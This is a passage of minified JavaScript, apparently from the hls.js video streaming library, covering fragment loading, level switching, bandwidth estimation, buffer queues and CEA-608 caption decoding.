buffered`),this._loadBitrateTestFrag(t,e)):(this.startFragRequested=!0,super.loadFragment(t,e,r)):this.clearTrackerIfNeeded(t)}getBufferedFrag(t){return this.fragmentTracker.getBufferedFrag(t,A)}followingBufferedFrag(t){return t?this.getBufferedFrag(t.end+.5):null}immediateLevelSwitch(){this.abortCurrentFrag(),this.flushMainBuffer(0,Number.POSITIVE_INFINITY)}nextLevelSwitch(){var{levels:e,media:r}=this;if(null!=r&&r.readyState){let t;var n;if(null!=(n=((n=this.getAppendedFrag(r.currentTime))&&1<n.start&&this.flushMainBuffer(0,n.start-1),this.getLevelDetails()))&&n.live){var i=this.getMainFwdBufferInfo();if(!i||i.len<2*n.targetduration)return}t=!r.paused&&e&&(i=e[this.hls.nextLoadLevel],n=this.fragLastKbps)&&this.fragCurrent?this.fragCurrent.duration*i.maxBitrate/(1e3*n)+1:0,(e=this.getBufferedFrag(r.currentTime+t))&&(i=this.followingBufferedFrag(e))&&(this.abortCurrentFrag(),n=i.maxStartPTS||i.start,r=i.duration,i=Math.max(e.end,n+Math.min(Math.max(r-this.config.maxFragLookUpTolerance,.5*r),.75*r)),this.flushMainBuffer(i,Number.POSITIVE_INFINITY))}}abortCurrentFrag(){var t=this.fragCurrent;switch(this.fragCurrent=null,this.backtrackFragment=null,t&&(t.abortRequests(),this.fragmentTracker.removeFragment(t)),this.state){case L_KEY_LOADING:case L_FRAG_LOADING:case L_FRAG_LOADING_WAITING_RETRY:case L_PARSING:case L_PARSED:this.state=L_IDLE}this.nextLoadPosition=this.getLoadPosition()}flushMainBuffer(t,e){super.flushMainBuffer(t,e,this.altAudio?"video":null)}onMediaAttached(t,e){super.onMediaAttached(t,e),t=e.media,this.onvplaying=this.onMediaPlaying.bind(this),this.onvseeked=this.onMediaSeeked.bind(this),t.addEventListener("playing",this.onvplaying),t.addEventListener("seeked",this.onvseeked),this.gapController=new Wn(this.config,t,this.fragmentTracker,this.hls)}onMediaDetaching(){var t=this.media;t&&this.onvplaying&&this.onvseeked&&(t.removeEventListener("playing",this.onvplaying),t.removeEventListener("seeked",this.onvseeked),this.onvplaying=this.onvseeked=null,this.videoBuffer=null),this.fragPlaying=null,this.gapController&&(this.gapController.destroy(),this.gapController=null),super.onMediaDetaching()}onMediaPlaying(){this.tick()}onMediaSeeked(){var t=(t=this.media)?t.currentTime:null;null===(t=(N(t)&&this.log("Media seeked to "+t.toFixed(3)),this.getMainFwdBufferInfo()))||0===t.len?this.warn(`Main forward buffer length on "seeked" event ${t?t.len:"empty"})`):this.tick()}onManifestLoading(){this.log("Trigger BUFFER_RESET"),this.hls.trigger($.BUFFER_RESET,void 0),this.fragmentTracker.removeAllFragments(),this.couldBacktrack=!1,this.startPosition=this.lastCurrentTime=0,this.levels=this.fragPlaying=this.backtrackFragment=null,this.altAudio=this.audioOnly=!1}onManifestParsed(t,e){let i,r=!1,n=!1;var a;e.levels.forEach((t=>{(i=t.audioCodec)&&(-1!==i.indexOf("mp4a.40.2")&&(r=!0),-1!==i.indexOf("mp4a.40.5"))&&(n=!0)})),this.audioCodecSwitch=r&&n&&!("function"==typeof(null==(a=Hr())||null==(a=a.prototype)?void 0:a.changeType)),this.audioCodecSwitch&&this.log("Both AAC/HE-AAC audio found in levels; declaring level codec as HE-AAC"),this.levels=e.levels,this.startFragRequested=!1}onLevelLoading(t,e){var r=this.levels;r&&this.state===L_IDLE&&(!(r=r[e.level]).details||r.details.live&&this.levelLastLoaded!==e.level||this.waitForCdnTuneIn(r.details))&&(this.state=L_WAITING_LEVEL)}onLevelLoaded(t,e){var r=this.levels,n=e.level,i=e.details,a=i.totalduration;if(r){this.log(`Level ${n} loaded [${i.startSN},${i.endSN}]${i.lastPartSn?`[part-${i.lastPartSn}-${i.lastPartIndex}]`:""}, cc [${i.startCC}, ${i.endCC}] duration:`+a),a=r[n],!(r=this.fragCurrent)||this.state!==L_FRAG_LOADING&&this.state!==L_FRAG_LOADING_WAITING_RETRY||r.level===e.level&&r.urlId===a.urlId||!r.loader||this.abortCurrentFrag();let t=0;if(i.live||null!=(e=a.details)&&e.live){if(this.checkLiveUpdate(i),i.deltaUpdateFailed)return;t=this.alignPlaylists(i,a.details)}if(a.details=i,this.levelLastLoaded=n,this.hls.trigger($.LEVEL_UPDATED,{details:i,level:n}),this.state===L_WAITING_LEVEL){if(this.waitForCdnTuneIn(i))return;this.state=L_IDLE}this.startFragRequested?i.live&&this.synchronizeToLiveEdge(i):this.setStartPosition(i,t),this.tick()}else this.warn("Levels were reset while loading level "+n)}_handleFragmentLoadProgress(t){var e,r,n,i,a,s,o,{frag:t,part:l,payload:u}=t,h=this.levels;h?(e=(h=h[t.level]).details)?(r=h.videoCodec,n=e.PTSKnown||!e.live,i=null==(i=t.initSegment)?void 0:i.data,h=this._getAudioCodec(h),a=this.transmuxer=this.transmuxer||new Vn(this.hls,A,this._handleTransmuxComplete.bind(this),this._handleTransmuxerFlush.bind(this)),o=-1!==(s=l?l.index:-1),s=new Cr(t.level,t.sn,t.stats.chunkCount,u.byteLength,s,o),o=this.initPTS[t.cc],a.push(u,i,h,r,t,l,e.totalduration,n,s,o)):(this.warn(`Dropping fragment ${t.sn} of level ${t.level} after level details were reset`),this.fragmentTracker.removeFragment(t)):this.warn(`Levels were reset while fragment load was in progress. Fragment ${t.sn} of level ${t.level} will not be buffered`)}onAudioTrackSwitching(t,e){var r,n=this.altAudio;!e.url&&(this.mediaBuffer!==this.media?(this.log("Switching on main audio, use media.buffered to schedule main fragment loading"),this.mediaBuffer=this.media,(r=this.fragCurrent)&&(this.log("Switching to main audio track, cancel main fragment load"),r.abortRequests(),this.fragmentTracker.removeFragment(r)),this.resetTransmuxer(),this.resetLoadingState()):this.audioOnly&&this.resetTransmuxer(),r=this.hls,n&&(r.trigger($.BUFFER_FLUSHING,{startOffset:0,endOffset:Number.POSITIVE_INFINITY,type:null}),this.fragmentTracker.removeAllFragments()),r.trigger($.AUDIO_TRACK_SWITCHED,e))}onAudioTrackSwitched(t,e){var r;e=e.id;(e=!!this.hls.audioTracks[e].url)&&(r=this.videoBuffer)&&this.mediaBuffer!==r&&(this.log("Switching on alternate audio, use video.buffered to schedule main fragment loading"),this.mediaBuffer=r),this.altAudio=e,this.tick()}onBufferCreated(t,e){var r=e.tracks;let n,i,a=!1;for(const o in r){var s=r[o];"main"===s.id?(i=o,n=s,"video"===o&&(s=r[o])&&(this.videoBuffer=s.buffer)):a=!0}a&&n?(this.log(`Alternate track found, use ${i}.buffered to schedule main fragment loading`),this.mediaBuffer=n.buffer):this.mediaBuffer=this.media}onFragBuffered(t,e){var r,{frag:e,part:n}=e;e&&e.type!==A||(this.fragContextChanged(e)?(this.warn(`Fragment ${e.sn}${n?" p: "+n.index:""} of level ${e.level} finished buffering, but was aborted. state: `+this.state),this.state===L_PARSED&&(this.state=L_IDLE)):(r=(n||e).stats,this.fragLastKbps=Math.round(8*r.total/(r.buffering.end-r.loading.first)),"initSegment"!==e.sn&&(this.fragPrevious=e),this.fragBufferedComplete(e,n)))}onError(t,e){var r;if(e.fatal)this.state=L_ERROR;else switch(e.details){case H.FRAG_GAP:case H.FRAG_PARSING_ERROR:case H.FRAG_DECRYPT_ERROR:case H.FRAG_LOAD_ERROR:case H.FRAG_LOAD_TIMEOUT:case H.KEY_LOAD_ERROR:case H.KEY_LOAD_TIMEOUT:this.onFragmentOrKeyLoadError(A,e);break;case H.LEVEL_LOAD_ERROR:case H.LEVEL_LOAD_TIMEOUT:case H.LEVEL_PARSING_ERROR:e.levelRetry||this.state!==L_WAITING_LEVEL||(null==(r=e.context)?void 0:r.type)!==Te||(this.state=L_IDLE);break;case H.BUFFER_FULL_ERROR:e.parent&&"main"===e.parent&&this.reduceLengthAndFlushBuffer(e)&&this.flushMainBuffer(0,Number.POSITIVE_INFINITY);break;case H.INTERNAL_EXCEPTION:this.recoverWorkerError(e)}}checkBuffer(){var t,{media:e,gapController:r}=this;e&&r&&e.readyState&&(!this.loadedmetadata&&S.getBuffered(e).length||(t=this.state!==L_IDLE?this.fragCurrent:null,r.poll(this.lastCurrentTime,t)),this.lastCurrentTime=e.currentTime)}onFragLoadEmergencyAborted(){this.state=L_IDLE,this.loadedmetadata||(this.startFragRequested=!1,this.nextLoadPosition=this.startPosition),this.tickImmediate()}onBufferFlushed(t,{type:e}){var r;(e!==y||this.audioOnly&&!this.altAudio)&&(r=(e===k?this.videoBuffer:this.mediaBuffer)||this.media,this.afterBufferFlushed(r,e,A))}onLevelsUpdated(t,e){this.levels=e.levels}swapAudioCodec(){this.audioCodecSwap=!this.audioCodecSwap}seekToStartPos(){var e=this.media;if(e){var r,n=e.currentTime;let t=this.startPosition;0<=t&&n<t&&(e.seeking?this.log(`could not seek to ${t}, already seeking at `+n):(0<(r=((r=S.getBuffered(e)).length?r.start(0):0)-t)&&(r<this.config.maxBufferHole||r<this.config.maxFragLookUpTolerance)&&(this.log(`adjusting start position by ${r} to match buffer start`),t+=r,this.startPosition=t),this.log(`seek to target start position ${t} from current time `+n),e.currentTime=t))}}_getAudioCodec(t){let e=this.config.defaultAudioCodec||t.audioCodec;return this.audioCodecSwap&&e&&(this.log("Swapping audio codec"),e=-1!==e.indexOf("mp4a.40.5")?"mp4a.40.2":"mp4a.40.5"),e}_loadBitrateTestFrag(n,i){n.bitrateTest=!0,this._doFragLoad(n,i).then((t=>{var e,r=this.hls;t&&!this.fragContextChanged(n)&&(i.fragmentError=0,this.state=L_IDLE,this.startFragRequested=!1,this.bitrateTest=!1,(e=n.stats).parsing.start=e.parsing.end=e.buffering.start=e.buffering.end=self.performance.now(),r.trigger($.FRAG_LOADED,t),n.bitrateTest=!1)}))}_handleTransmuxComplete(t){var i,e="main",r=this.hls,{remuxResult:t,chunkMeta:n}=t;if(i=this.getCurrentContext(n)){var{frag:i,part:a,level:s}=i,{video:o,text:l,id3:u,initSegment:h}=t,c=s.details,d=this.altAudio?void 0:t.audio;if(this.fragContextChanged(i))this.fragmentTracker.removeFragment(i);else{if(this.state=L_PARSING,h&&(null!=h&&h.tracks&&(f=i.initSegment||i,this._bufferInitSegment(s,h.tracks,f,n),r.trigger($.FRAG_PARSING_INIT_SEGMENT,{frag:f,id:e,tracks:h.tracks})),s=h.initPTS,f=h.timescale,N(s))&&(this.initPTS[i.cc]={baseTime:s,timescale:f},r.trigger($.INIT_PTS_FOUND,{frag:i,id:e,initPTS:s,timescale:f})),o&&c&&"initSegment"!==i.sn){var h=c.fragments[i.sn-1-c.startSN],s=i.sn===c.startSN,f=!h||i.cc>h.cc;if(!1!==t.independent){var{startPTS:h,endPTS:t,startDTS:p,endDTS:g}=o;if(a)a.elementaryStreams[o.type]={startPTS:h,endPTS:t,startDTS:p,endDTS:g};else if(o.firstKeyFrame&&o.independent&&1===n.id&&!f&&(this.couldBacktrack=!0),o.dropped&&o.independent){var v=((v=this.getMainFwdBufferInfo())?v.end:this.getLoadPosition())+this.config.maxBufferHole,m=o.firstKeyFramePTS||h;if(!s&&v<m-this.config.maxBufferHole&&!f)return void this.backtrack(i);f&&(i.gap=!0),i.setElementaryStreamInfo(o.type,i.start,t,i.start,g,!0)}i.setElementaryStreamInfo(o.type,h,t,p,g),this.backtrackFragment&&(this.backtrackFragment=i),this.bufferFragmentData(o,i,a,n,s||f)}else{if(!s&&!f)return void this.backtrack(i);i.gap=!0}}d&&(({startPTS:v,endPTS:m,startDTS:h,endDTS:t}=d),a&&(a.elementaryStreams[y]={startPTS:v,endPTS:m,startDTS:h,endDTS:t}),i.setElementaryStreamInfo(y,v,m,h,t),this.bufferFragmentData(d,i,a,n)),c&&null!=u&&null!=(p=u.samples)&&p.length&&(g={id:e,frag:i,details:c,samples:u.samples},r.trigger($.FRAG_PARSING_METADATA,g)),c&&l&&(o={id:e,frag:i,details:c,samples:l.samples},r.trigger($.FRAG_PARSING_USERDATA,o))}}else this.resetWhenMissingContext(n)}_bufferInitSegment(e,r,n,i){if(this.state===L_PARSING){this.audioOnly=!!r.audio&&!r.video,this.altAudio&&!this.audioOnly&&delete r.audio;var{audio:a,video:t,audiovideo:s}=r;if(a){let t=e.audioCodec;var o=navigator.userAgent.toLowerCase();this.audioCodecSwitch&&(t=t&&(-1!==t.indexOf("mp4a.40.5")?"mp4a.40.2":"mp4a.40.5"),1!==a.metadata.channelCount)&&-1===o.indexOf("firefox")&&(t="mp4a.40.5"),-1!==o.indexOf("android")&&"audio/mpeg"!==a.container&&(t="mp4a.40.2",this.log("Android: force audio codec to "+t)),e.audioCodec&&e.audioCodec!==t&&this.log(`Swapping manifest audio codec "${e.audioCodec}" for "${t}"`),a.levelCodec=t,a.id="main",this.log(`Init audio buffer, container:${a.container}, codecs[selected/level/parsed]=[${t||""}/${e.audioCodec||""}/${a.codec}]`)}t&&(t.levelCodec=e.videoCodec,t.id="main",this.log(`Init video buffer, container:${t.container}, codecs[level/parsed]=[${e.videoCodec||""}/${t.codec}]`)),s&&this.log(`Init audiovideo buffer, container:${s.container}, codecs[level/parsed]=[${e.attrs.CODECS||""}/${s.codec}]`),this.hls.trigger($.BUFFER_CODECS,r),Object.keys(r).forEach((t=>{var e=r[t].initSegment;null!=e&&e.byteLength&&this.hls.trigger($.BUFFER_APPENDING,{type:t,data:e,frag:n,part:null,chunkMeta:i,parent:n.type})})),this.tick()}}getMainFwdBufferInfo(){return this.getFwdBufferInfo(this.mediaBuffer||this.media,A)}backtrack(t){this.couldBacktrack=!0,this.backtrackFragment=t,this.resetTransmuxer(),this.flushBufferGap(t),this.fragmentTracker.removeFragment(t),this.fragPrevious=null,this.nextLoadPosition=t.start,this.state=L_IDLE}checkFragmentChanged(){var t,e=this.media;let r=null;e&&1<e.readyState&&!1===e.seeking&&(t=e.currentTime,S.isBuffered(e,t)?r=this.getAppendedFrag(t):S.isBuffered(e,t+.1)&&(r=this.getAppendedFrag(t+.1)),r)&&(this.backtrackFragment=null,e=this.fragPlaying,t=r.level,e&&r.sn===e.sn&&e.level===t&&r.urlId===e.urlId||(this.fragPlaying=r,this.hls.trigger($.FRAG_CHANGED,{frag:r}),e&&e.level===t)||this.hls.trigger($.LEVEL_SWITCHED,{level:t}))}get nextLevel(){var t=this.nextBufferedFrag;return t?t.level:-1}get currentFrag(){var t=this.media;return t?this.fragPlaying||this.getAppendedFrag(t.currentTime):null}get currentProgramDateTime(){if(t=this.media){var t=t.currentTime,e=this.currentFrag;if(e&&N(t)&&N(e.programDateTime))return t=e.programDateTime+1e3*(t-e.start),new Date(t)}return null}get currentLevel(){var t=this.currentFrag;return t?t.level:-1}get nextBufferedFrag(){var t=this.currentFrag;return t?this.followingBufferedFrag(t):null}get forceStartLoad(){return this._forceStartLoad}}class qn{constructor(t,e=0,r=0){this.halfLife=void 0,this.alpha_=void 0,this.estimate_=void 0,this.totalWeight_=void 0,this.halfLife=t,this.alpha_=t?Math.exp(Math.log(.5)/t):0,this.estimate_=e,this.totalWeight_=r}sample(t,e){var r=Math.pow(this.alpha_,t);this.estimate_=e*(1-r)+r*this.estimate_,this.totalWeight_+=t}getTotalWeight(){return this.totalWeight_}getEstimate(){if(this.alpha_){var t=1-Math.pow(this.alpha_,this.totalWeight_);if(t)return this.estimate_/t}return this.estimate_}}class zn{constructor(t,e,r,n=100){this.defaultEstimate_=void 0,this.minWeight_=void 0,this.minDelayMs_=void 0,this.slow_=void 0,this.fast_=void 0,this.defaultTTFB_=void 0,this.ttfb_=void 0,this.defaultEstimate_=r,this.minWeight_=.001,this.minDelayMs_=50,this.slow_=new qn(t),this.fast_=new qn(e),this.defaultTTFB_=n,this.ttfb_=new qn(t)}update(t,e){var{slow_:r,fast_:n,ttfb_:i}=this;r.halfLife!==t&&(this.slow_=new qn(t,r.getEstimate(),r.getTotalWeight())),n.halfLife!==e&&(this.fast_=new qn(e,n.getEstimate(),n.getTotalWeight())),i.halfLife!==t&&(this.ttfb_=new qn(t,i.getEstimate(),i.getTotalWeight()))}sample(t,e){e=8*e/(t=(t=Math.max(t,this.minDelayMs_))/1e3),this.fast_.sample(t,e),this.slow_.sample(t,e)}sampleTTFB(t){var e=t/1e3;e=Math.sqrt(2)*Math.exp(-Math.pow(e,2)/2);this.ttfb_.sample(e,Math.max(t,5))}canEstimate(){return this.fast_.getTotalWeight()>=this.minWeight_}getEstimate(){return this.canEstimate()?Math.min(this.fast_.getEstimate(),this.slow_.getEstimate()):this.defaultEstimate_}getEstimateTTFB(){return this.ttfb_.getTotalWeight()>=this.minWeight_?this.ttfb_.getEstimate():this.defaultTTFB_}destroy(){}}class Qn{constructor(){this.chunks=[],this.dataLength=0}push(t){this.chunks.push(t),this.dataLength+=t.length}flush(){var{chunks:t,dataLength:e}=this;let r;return t.length?(r=1===t.length?t[0]:function(e,t){var r=new Uint8Array(t);let n=0;for(let t=0;t<e.length;t++){var i=e[t];r.set(i,n),n+=i.length}return r}(t,e),this.reset(),r):new Uint8Array(0)}reset(){this.chunks.length=0,this.dataLength=0}}function Xn(e,r){if(e.length!==r.length)return!1;for(let t=0;t<e.length;t++)if(!function(e,r){var t=e["STABLE-RENDITION-ID"];return t?t===r["STABLE-RENDITION-ID"]:!["LANGUAGE","NAME","CHARACTERISTICS","AUTOSELECT","DEFAULT","FORCED"].some((t=>e[t]!==r[t]))}(e[t].attrs,r[t].attrs))return!1;return!0}class Jn{constructor(n){this.buffered=void 0;const e=(t,e,r)=>{if(r-1<(e>>>=0))throw new DOMException(`Failed to execute '${t}' on 'TimeRanges': The index provided (${e}) is greater than the maximum bound (${r})`);return n[e][t]};this.buffered={get length(){return n.length},end:t=>e("end",t,n.length),start:t=>e("start",t,n.length)}}}function Zn(e){var r=[];for(let t=0;t<e.length;t++){var n=e[t];"subtitles"!==n.kind&&"captions"!==n.kind||!n.label||r.push(e[t])}return r}class ti{constructor(t){this.buffers=void 0,this.queues={video:[],audio:[],audiovideo:[]},this.buffers=t}append(t,e){var r=this.queues[e];r.push(t),1===r.length&&this.buffers[e]&&this.executeNext(e)}insertAbort(t,e){this.queues[e].unshift(t),this.executeNext(e)}appendBlocker(t){let e;var r=new Promise((t=>{e=t})),n={execute:e,onStart:()=>{},onComplete:()=>{},onError:()=>{}};return this.append(n,t),r}executeNext(e){var n,{buffers:r,queues:n}=this,r=r[e];if((n=n[e]).length){var i=n[0];try{i.execute()}catch(t){V.warn("[buffer-operation-queue]: Unhandled exception executing the current operation"),i.onError(t),null!=r&&r.updating||(n.shift(),this.executeNext(e))}}}shiftAndExecuteNext(t){this.queues[t].shift(),this.executeNext(t)}current(t){return this.queues[t][0]}}const ei=ie(),ri=/([ha]vc.)(?:\.[^.,]+)+/;function ni(t){let e=t;return ii.hasOwnProperty(t)&&(e=ii[t]),String.fromCharCode(e)}const ii={42:225,92:233,94:237,95:243,96:250,123:231,124:247,125:209,126:241,127:9608,128:174,129:176,130:189,131:191,132:8482,133:162,134:163,135:9834,136:224,137:32,138:232,139:226,140:234,141:238,142:244,143:251,144:193,145:201,146:211,147:218,148:220,149:252,150:8216,151:161,152:42,153:8217,154:9473,155:169,156:8480,157:8226,158:8220,159:8221,160:192,161:194,162:199,163:200,164:202,165:203,166:235,167:206,168:207,169:239,170:212,171:217,172:249,173:219,174:171,175:187,176:195,177:227,178:205,179:204,180:236,181:210,182:242,183:213,184:245,185:123,186:125,187:92,188:94,189:95,190:124,191:8764,192:196,193:228,194:214,195:246,196:223,197:165,198:164,199:9475,200:197,201:229,202:216,203:248,204:9487,205:9491,206:9495,207:9499},ai=100,si={17:1,18:3,21:5,22:7,23:9,16:11,19:12,20:14},oi={17:2,18:4,21:6,22:8,23:10,19:13,20:15},li={25:1,26:3,29:5,30:7,31:9,24:11,27:12,28:14},ui={25:2,26:4,29:6,30:8,31:10,27:13,28:15},hi=["white","green","blue","cyan","red","yellow","magenta","black","transparent"];class ci{constructor(){this.time=null,this.verboseLevel=0}log(t,e){this.verboseLevel>=t&&(e="function"==typeof e?e():e,V.log(this.time+` [${t}] `+e))}}function di(e){var r=[];for(let t=0;t<e.length;t++)r.push(e[t].toString(16));return r}class fi{constructor(t,e,r,n,i){this.foreground=void 0,this.underline=void 0,this.italics=void 0,this.background=void 0,this.flash=void 0,this.foreground=t||"white",this.underline=e||!1,this.italics=r||!1,this.background=n||"black",this.flash=i||!1}reset(){this.foreground="white",this.underline=!1,this.italics=!1,this.background="black",this.flash=!1}setStyles(e){var r=["foreground","underline","italics","background","flash"];for(let t=0;t<r.length;t++){var n=r[t];e.hasOwnProperty(n)&&(this[n]=e[n])}}isDefault(){return"white"===this.foreground&&!this.underline&&!this.italics&&"black"===this.background&&!this.flash}equals(t){return this.foreground===t.foreground&&this.underline===t.underline&&this.italics===t.italics&&this.background===t.background&&this.flash===t.flash}copy(t){this.foreground=t.foreground,this.underline=t.underline,this.italics=t.italics,this.background=t.background,this.flash=t.flash}toString(){return"color="+this.foreground+", underline="+this.underline+", italics="+this.italics+", background="+this.background+", flash="+this.flash}}class pi{constructor(t,e,r,n,i,a){this.uchar=void 0,this.penState=void 0,this.uchar=t||" ",this.penState=new fi(e,r,n,i,a)}reset(){this.uchar=" ",this.penState.reset()}setChar(t,e){this.uchar=t,this.penState.copy(e)}setPenState(t){this.penState.copy(t)}equals(t){return this.uchar===t.uchar&&this.penState.equals(t.penState)}copy(t){this.uchar=t.uchar,this.penState.copy(t.penState)}isEmpty(){return" "===this.uchar&&this.penState.isDefault()}}class gi{constructor(t){this.chars=void 0,this.pos=void 0,this.currPenState=void 0,this.cueStartTime=void 0,this.logger=void 0,this.chars=[];for(let t=0;t<ai;t++)this.chars.push(new pi);this.logger=t,this.pos=0,this.currPenState=new fi}equals(e){let r=!0;for(let t=0;t<ai;t++)if(!this.chars[t].equals(e.chars[t])){r=!1;break}return r}copy(e){for(let t=0;t<ai;t++)this.chars[t].copy(e.chars[t])}isEmpty(){let e=!0;for(let t=0;t<ai;t++)if(!this.chars[t].isEmpty()){e=!1;break}return e}setCursor(t){this.pos!==t&&(this.pos=t),this.pos<0?(this.logger.log(3,"Negative cursor position "+this.pos),this.pos=0):this.pos>ai&&(this.logger.log(3,"Too large cursor position "+this.pos),this.pos=ai)}moveCursor(t){var e=this.pos+t;if(1<t)for(let t=this.pos+1;t<e+1;t++)this.chars[t].setPenState(this.currPenState);this.setCursor(e)}backSpace(){this.moveCursor(-1),this.chars[this.pos].setChar(" ",this.currPenState)}insertChar(t){144<=t&&this.backSpace();const e=ni(t);this.pos>=ai?this.logger.log(0,(()=>"Cannot insert "+t.toString(16)+" ("+e+") at position "+this.pos+". Skipping it!")):(this.chars[this.pos].setChar(e,this.currPenState),this.moveCursor(1))}clearFromPos(t){let e;for(e=t;e<ai;e++)this.chars[e].reset()}clear(){this.clearFromPos(0),this.pos=0,this.currPenState.reset()}clearToEndOfRow(){this.clearFromPos(this.pos)}getTextString(){var e=[];let r=!0;for(let t=0;t<ai;t++){var n=this.chars[t].uchar;" "!==n&&(r=!1),e.push(n)}return r?"":e.join("")}setPenStyles(t){this.currPenState.setStyles(t),this.chars[this.pos].setPenState(this.currPenState)}}class vi{constructor(e){this.rows=void 0,this.currRow=void 0,this.nrRollUpRows=void 0,this.lastOutputScreen=void 0,this.logger=void 0,this.rows=[];for(let t=0;t<15;t++)this.rows.push(new gi(e));this.logger=e,this.currRow=14,this.nrRollUpRows=null,this.lastOutputScreen=null,this.reset()}reset(){for(let t=0;t<15;t++)this.rows[t].clear();this.currRow=14}equals(e){let r=!0;for(let t=0;t<15;t++)if(!this.rows[t].equals(e.rows[t])){r=!1;break}return r}copy(e){for(let t=0;t<15;t++)this.rows[t].copy(e.rows[t])}isEmpty(){let e=!0;for(let t=0;t<15;t++)if(!this.rows[t].isEmpty()){e=!1;break}return e}backSpace(){this.rows[this.currRow].backSpace()}clearToEndOfRow(){this.rows[this.currRow].clearToEndOfRow()}insertChar(t){this.rows[this.currRow].insertChar(t)}setPen(t){this.rows[this.currRow].setPenStyles(t)}moveCursor(t){this.rows[this.currRow].moveCursor(t)}setCursor(t){this.logger.log(2,"setCursor: "+t),this.rows[this.currRow].setCursor(t)}setPAC(t){this.logger.log(2,(()=>"pacData = "+JSON.stringify(t)));let e=t.row-1;if(this.nrRollUpRows&&e<this.nrRollUpRows-1&&(e=this.nrRollUpRows-1),this.nrRollUpRows&&this.currRow!==e){for(let t=0;t<15;t++)this.rows[t].clear();var r=this.currRow+1-this.nrRollUpRows,n=this.lastOutputScreen;if(n){var i=n.rows[r].cueStartTime,a=this.logger.time;if(i&&null!==a&&i<a)for(let t=0;t<this.nrRollUpRows;t++)this.rows[e-this.nrRollUpRows+t+1].copy(n.rows[r+t])}}this.currRow=e,i=this.rows[this.currRow],null!==t.indent&&(a=t.indent,a=Math.max(a-1,0),i.setCursor(t.indent),t.color=i.chars[a].penState.foreground),i={foreground:t.color,underline:t.underline,italics:t.italics,background:"black",flash:!1},this.setPen(i)}setBkgData(t){this.logger.log(2,(()=>"bkgData = "+JSON.stringify(t))),this.backSpace(),this.setPen(t),this.insertChar(32)}setRollUpRows(t){this.nrRollUpRows=t}rollUp(){var t;null===this.nrRollUpRows?this.logger.log(3,"roll_up but nrRollUpRows not set yet"):(this.logger.log(1,(()=>this.getDisplayText())),t=this.currRow+1-this.nrRollUpRows,(t=this.rows.splice(t,1)[0]).clear(),this.rows.splice(this.currRow,0,t),this.logger.log(2,"Rolling up"))}getDisplayText(e){e=e||!1;var r=[];let t="";var n;for(let t=0;t<15;t++){var i=this.rows[t].getTextString();i&&(n=t+1,r.push(e?"Row "+n+": '"+i+"'":i.trim()))}return 0<r.length?e?"["+r.join(" | ")+"]":r.join("\n"):t}getTextAndFormat(){return this.rows}}class mi{constructor(t,e,r){this.chNr=void 0,this.outputFilter=void 0,this.mode=void 0,this.verbose=void 0,this.displayedMemory=void 0,this.nonDisplayedMemory=void 0,this.lastOutputScreen=void 0,this.currRollUpRow=void 0,this.writeScreen=void 0,this.cueStartTime=void 0,this.logger=void 0,this.chNr=t,this.outputFilter=e,this.mode=null,this.verbose=0,this.displayedMemory=new vi(r),this.nonDisplayedMemory=new vi(r),this.lastOutputScreen=new vi(r),this.currRollUpRow=this.displayedMemory.rows[14],this.writeScreen=this.displayedMemory,this.mode=null,this.cueStartTime=null,this.logger=r}reset(){this.mode=null,this.displayedMemory.reset(),this.nonDisplayedMemory.reset(),this.lastOutputScreen.reset(),this.outputFilter.reset(),this.currRollUpRow=this.displayedMemory.rows[14],this.writeScreen=this.displayedMemory,this.mode=null,this.cueStartTime=null}getHandler(){return this.outputFilter}setHandler(t){this.outputFilter=t}setPAC(t){this.writeScreen.setPAC(t)}setBkgData(t){this.writeScreen.setBkgData(t)}setMode(t){t!==this.mode&&(this.mode=t,this.logger.log(2,(()=>"MODE="+t)),"MODE_POP-ON"===this.mode?this.writeScreen=this.nonDisplayedMemory:(this.writeScreen=this.displayedMemory,this.writeScreen.reset()),"MODE_ROLL-UP"!==this.mode&&(this.displayedMemory.nrRollUpRows=null,this.nonDisplayedMemory.nrRollUpRows=null),this.mode=t)}insertChars(e){for(let t=0;t<e.length;t++)this.writeScreen.insertChar(e[t]);const t=this.writeScreen===this.displayedMemory?"DISP":"NON_DISP";this.logger.log(2,(()=>t+": "+this.writeScreen.getDisplayText(!0))),"MODE_PAINT-ON"!==this.mode&&"MODE_ROLL-UP"!==this.mode||(this.logger.log(1,(()=>"DISPLAYED: "+this.displayedMemory.getDisplayText(!0))),this.outputDataUpdate())}ccRCL(){this.logger.log(2,"RCL - Resume Caption Loading"),this.setMode("MODE_POP-ON")}ccBS(){this.logger.log(2,"BS - BackSpace"),"MODE_TEXT"!==this.mode&&(this.writeScreen.backSpace(),this.writeScreen===this.displayedMemory)&&this.outputDataUpdate()}ccAOF(){}ccAON(){}ccDER(){this.logger.log(2,"DER- Delete to End of Row"),this.writeScreen.clearToEndOfRow(),this.outputDataUpdate()}ccRU(t){this.logger.log(2,"RU("+t+") - Roll Up"),this.writeScreen=this.displayedMemory,this.setMode("MODE_ROLL-UP"),this.writeScreen.setRollUpRows(t)}ccFON(){this.logger.log(2,"FON - Flash On"),this.writeScreen.setPen({flash:!0})}ccRDC(){this.logger.log(2,"RDC - Resume Direct Captioning"),this.setMode("MODE_PAINT-ON")}ccTR(){this.logger.log(2,"TR"),this.setMode("MODE_TEXT")}ccRTD(){this.logger.log(2,"RTD"),this.setMode("MODE_TEXT")}ccEDM(){this.logger.log(2,"EDM - Erase Displayed Memory"),this.displayedMemory.reset(),this.outputDataUpdate(!0)}ccCR(){this.logger.log(2,"CR - Carriage Return"),this.writeScreen.rollUp(),this.outputDataUpdate(!0)}ccENM(){this.logger.log(2,"ENM - Erase Non-displayed Memory"),this.nonDisplayedMemory.reset()}ccEOC(){var t;this.logger.log(2,"EOC - End Of Caption"),"MODE_POP-ON"===this.mode&&(t=this.displayedMemory,this.displayedMemory=this.nonDisplayedMemory,this.nonDisplayedMemory=t,this.writeScreen=this.nonDisplayedMemory,this.logger.log(1,(()=>"DISP: "+this.displayedMemory.getDisplayText()))),this.outputDataUpdate(!0)}ccTO(t){this.logger.log(2,"TO("+t+") - Tab Offset"),this.writeScreen.moveCursor(t)}ccMIDROW(t){var e={flash:!1};e.underline=t%2==1,e.italics=46<=t,e.italics?e.foreground="white":(t=Math.floor(t/2)-16,e.foreground=["white","green","blue","cyan","red","yellow","magenta"][t]),this.logger.log(2,"MIDROW: "+JSON.stringify(e)),this.writeScreen.setPen(e)}outputDataUpdate(t=!1){var 